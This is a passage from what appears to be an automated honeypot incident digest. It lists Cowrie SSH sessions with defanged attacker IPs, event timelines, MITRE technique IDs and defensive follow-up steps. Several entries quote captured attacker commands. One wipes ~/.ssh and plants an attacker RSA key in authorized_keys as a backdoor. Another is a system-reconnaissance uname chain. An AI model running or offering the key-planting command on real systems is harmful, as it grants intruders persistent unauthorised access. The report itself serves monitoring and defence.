| **First Seen** | 2026-07-06 07:10 |
| **Last Seen** | 2026-07-06 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:10:39` | `cowrie.session.connect` |
| `2026-07-06 07:10:39` | `cowrie.client.version` |
| `2026-07-06 07:10:39` | `cowrie.client.kex` |
| `2026-07-06 07:10:39` | `cowrie.login.success` |
| `2026-07-06 07:10:40` | `cowrie.session.params` |
| `2026-07-06 07:10:40` | `cowrie.command.input` |
| `2026-07-06 07:10:40` | `cowrie.command.failed` |
| `2026-07-06 07:10:40` | `cowrie.log.closed` |
| `2026-07-06 07:10:41` | `cowrie.session.params` |
| `2026-07-06 07:10:41` | `cowrie.command.input` |
| `2026-07-06 07:10:41` | `cowrie.session.file_download` |
| `2026-07-06 07:10:41` | `cowrie.log.closed` |
| `2026-07-06 07:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.1[.]182` to AbuseIPDB if not already reported
- [ ] Block `187.212.1[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42564ee7152b

| Field | Detail |
|---|---|
| **Source IP** | `187.212.1[.]182` |
| **First Seen** | 2026-07-06 07:10 |
| **Last Seen** | 2026-07-06 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:10:41` | `cowrie.session.connect` |
| `2026-07-06 07:10:41` | `cowrie.client.version` |
| `2026-07-06 07:10:41` | `cowrie.client.kex` |
| `2026-07-06 07:10:41` | `cowrie.login.success` |
| `2026-07-06 07:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.1[.]182` to AbuseIPDB if not already reported
- [ ] Block `187.212.1[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b7f429e3e0

| Field | Detail |
|---|---|
| **Source IP** | `187.212.1[.]182` |
| **First Seen** | 2026-07-06 07:10 |
| **Last Seen** | 2026-07-06 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:10:41` | `cowrie.session.connect` |
| `2026-07-06 07:10:41` | `cowrie.client.version` |
| `2026-07-06 07:10:42` | `cowrie.client.kex` |
| `2026-07-06 07:10:42` | `cowrie.login.success` |
| `2026-07-06 07:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.1[.]182` to AbuseIPDB if not already reported
- [ ] Block `187.212.1[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e45bca3aa38b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 07:11 |
| **Last Seen** | 2026-07-06 07:11 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:11:04` | `cowrie.session.connect` |
| `2026-07-06 07:11:05` | `cowrie.client.version` |
| `2026-07-06 07:11:05` | `cowrie.client.kex` |
| `2026-07-06 07:11:12` | `cowrie.login.success` |
| `2026-07-06 07:11:17` | `cowrie.session.params` |
| `2026-07-06 07:11:17` | `cowrie.command.input` |
| `2026-07-06 07:11:19` | `cowrie.log.closed` |
| `2026-07-06 07:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b718d0105194

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:11 |
| **Last Seen** | 2026-07-06 07:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:11:18` | `cowrie.session.connect` |
| `2026-07-06 07:11:21` | `cowrie.client.version` |
| `2026-07-06 07:11:21` | `cowrie.client.kex` |
| `2026-07-06 07:11:26` | `cowrie.login.success` |
| `2026-07-06 07:11:28` | `cowrie.session.params` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.success` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:28` | `cowrie.command.input` |
| `2026-07-06 07:11:29` | `cowrie.log.closed` |
| `2026-07-06 07:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5548e5cc680e

| Field | Detail |
|---|---|
| **Source IP** | `104.243.42[.]167` |
| **First Seen** | 2026-07-06 07:14 |
| **Last Seen** | 2026-07-06 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:14:35` | `cowrie.session.connect` |
| `2026-07-06 07:14:35` | `cowrie.client.version` |
| `2026-07-06 07:14:35` | `cowrie.client.kex` |
| `2026-07-06 07:14:35` | `cowrie.login.success` |
| `2026-07-06 07:14:35` | `cowrie.session.params` |
| `2026-07-06 07:14:35` | `cowrie.command.input` |
| `2026-07-06 07:14:35` | `cowrie.command.failed` |
| `2026-07-06 07:14:35` | `cowrie.log.closed` |
| `2026-07-06 07:14:36` | `cowrie.session.params` |
| `2026-07-06 07:14:36` | `cowrie.command.input` |
| `2026-07-06 07:14:36` | `cowrie.session.file_download` |
| `2026-07-06 07:14:36` | `cowrie.log.closed` |
| `2026-07-06 07:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.243.42[.]167` to AbuseIPDB if not already reported
- [ ] Block `104.243.42[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb766472fe93

| Field | Detail |
|---|---|
| **Source IP** | `104.243.42[.]167` |
| **First Seen** | 2026-07-06 07:14 |
| **Last Seen** | 2026-07-06 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:14:36` | `cowrie.session.connect` |
| `2026-07-06 07:14:36` | `cowrie.client.version` |
| `2026-07-06 07:14:36` | `cowrie.client.kex` |
| `2026-07-06 07:14:37` | `cowrie.login.success` |
| `2026-07-06 07:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.243.42[.]167` to AbuseIPDB if not already reported
- [ ] Block `104.243.42[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40280e1206d9

| Field | Detail |
|---|---|
| **Source IP** | `104.243.42[.]167` |
| **First Seen** | 2026-07-06 07:14 |
| **Last Seen** | 2026-07-06 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:14:37` | `cowrie.session.connect` |
| `2026-07-06 07:14:37` | `cowrie.client.version` |
| `2026-07-06 07:14:37` | `cowrie.client.kex` |
| `2026-07-06 07:14:37` | `cowrie.login.success` |
| `2026-07-06 07:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.243.42[.]167` to AbuseIPDB if not already reported
- [ ] Block `104.243.42[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e01fd178e2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 07:15 |
| **Last Seen** | 2026-07-06 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:15:32` | `cowrie.session.connect` |
| `2026-07-06 07:15:32` | `cowrie.client.version` |
| `2026-07-06 07:15:32` | `cowrie.client.kex` |
| `2026-07-06 07:15:32` | `cowrie.login.success` |
| `2026-07-06 07:15:32` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:15:32` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7254b3b674

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:16 |
| **Last Seen** | 2026-07-06 07:17 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:16:32` | `cowrie.session.connect` |
| `2026-07-06 07:16:35` | `cowrie.client.version` |
| `2026-07-06 07:16:35` | `cowrie.client.kex` |
| `2026-07-06 07:16:59` | `cowrie.login.success` |
| `2026-07-06 07:17:08` | `cowrie.session.params` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.success` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:08` | `cowrie.command.input` |
| `2026-07-06 07:17:09` | `cowrie.log.closed` |
| `2026-07-06 07:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfa2292ce1d1

| Field | Detail |
|---|---|
| **Source IP** | `34.77.97[.]43` |
| **First Seen** | 2026-07-06 07:16 |
| **Last Seen** | 2026-07-06 07:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:16:36` | `cowrie.session.connect` |
| `2026-07-06 07:16:36` | `cowrie.login.success` |
| `2026-07-06 07:16:36` | `cowrie.session.params` |
| `2026-07-06 07:16:36` | `cowrie.command.input` |
| `2026-07-06 07:16:36` | `cowrie.command.input` |
| `2026-07-06 07:16:36` | `cowrie.command.failed` |
| `2026-07-06 07:16:36` | `cowrie.command.input` |
| `2026-07-06 07:16:36` | `cowrie.log.closed` |
| `2026-07-06 07:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.97[.]43` to AbuseIPDB if not already reported
- [ ] Block `34.77.97[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f766d107348

| Field | Detail |
|---|---|
| **Source IP** | `34.77.97[.]43` |
| **First Seen** | 2026-07-06 07:16 |
| **Last Seen** | 2026-07-06 07:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:16:44` | `cowrie.session.connect` |
| `2026-07-06 07:16:44` | `cowrie.login.success` |
| `2026-07-06 07:16:45` | `cowrie.session.params` |
| `2026-07-06 07:16:45` | `cowrie.command.input` |
| `2026-07-06 07:16:45` | `cowrie.command.failed` |
| `2026-07-06 07:16:53` | `cowrie.log.closed` |
| `2026-07-06 07:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.97[.]43` to AbuseIPDB if not already reported
- [ ] Block `34.77.97[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bd1fbc9aa05

| Field | Detail |
|---|---|
| **Source IP** | `34.77.97[.]43` |
| **First Seen** | 2026-07-06 07:16 |
| **Last Seen** | 2026-07-06 07:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:16:46` | `cowrie.session.connect` |
| `2026-07-06 07:16:46` | `cowrie.login.success` |
| `2026-07-06 07:16:46` | `cowrie.session.params` |
| `2026-07-06 07:16:46` | `cowrie.command.input` |
| `2026-07-06 07:16:53` | `cowrie.log.closed` |
| `2026-07-06 07:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.97[.]43` to AbuseIPDB if not already reported
- [ ] Block `34.77.97[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd9a8aaf1f8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 07:18 |
| **Last Seen** | 2026-07-06 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:18:06` | `cowrie.session.connect` |
| `2026-07-06 07:18:06` | `cowrie.client.version` |
| `2026-07-06 07:18:06` | `cowrie.client.kex` |
| `2026-07-06 07:18:07` | `cowrie.login.success` |
| `2026-07-06 07:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc38e9e1c8c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 07:18 |
| **Last Seen** | 2026-07-06 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:18:06` | `cowrie.session.connect` |
| `2026-07-06 07:18:06` | `cowrie.client.version` |
| `2026-07-06 07:18:06` | `cowrie.client.kex` |
| `2026-07-06 07:18:07` | `cowrie.login.success` |
| `2026-07-06 07:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471a6c280cfb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 07:18 |
| **Last Seen** | 2026-07-06 07:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:18:28` | `cowrie.session.connect` |
| `2026-07-06 07:18:28` | `cowrie.client.version` |
| `2026-07-06 07:18:28` | `cowrie.client.kex` |
| `2026-07-06 07:18:28` | `cowrie.login.success` |
| `2026-07-06 07:18:28` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:18:28` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 07:18:28` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-698a9d38038e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:18 |
| **Last Seen** | 2026-07-06 07:19 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:18:59` | `cowrie.session.connect` |
| `2026-07-06 07:19:03` | `cowrie.client.version` |
| `2026-07-06 07:19:03` | `cowrie.client.kex` |
| `2026-07-06 07:19:15` | `cowrie.login.success` |
| `2026-07-06 07:19:25` | `cowrie.session.params` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.success` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:25` | `cowrie.command.input` |
| `2026-07-06 07:19:30` | `cowrie.log.closed` |
| `2026-07-06 07:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d1f50ad50f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 07:20 |
| **Last Seen** | 2026-07-06 07:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:20:11` | `cowrie.session.connect` |
| `2026-07-06 07:20:11` | `cowrie.client.version` |
| `2026-07-06 07:20:11` | `cowrie.client.kex` |
| `2026-07-06 07:20:11` | `cowrie.login.success` |
| `2026-07-06 07:20:11` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:20:11` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 07:20:11` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e8b599b70a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:21 |
| **Last Seen** | 2026-07-06 07:22 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:21:36` | `cowrie.session.connect` |
| `2026-07-06 07:21:40` | `cowrie.client.version` |
| `2026-07-06 07:21:40` | `cowrie.client.kex` |
| `2026-07-06 07:21:57` | `cowrie.login.success` |
| `2026-07-06 07:22:03` | `cowrie.session.params` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.success` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:03` | `cowrie.command.input` |
| `2026-07-06 07:22:07` | `cowrie.log.closed` |
| `2026-07-06 07:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728856dfb509

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 07:23 |
| **Last Seen** | 2026-07-06 07:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:23:49` | `cowrie.session.connect` |
| `2026-07-06 07:23:51` | `cowrie.client.version` |
| `2026-07-06 07:23:51` | `cowrie.client.kex` |
| `2026-07-06 07:23:58` | `cowrie.login.success` |
| `2026-07-06 07:24:02` | `cowrie.session.params` |
| `2026-07-06 07:24:02` | `cowrie.command.input` |
| `2026-07-06 07:24:04` | `cowrie.log.closed` |
| `2026-07-06 07:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
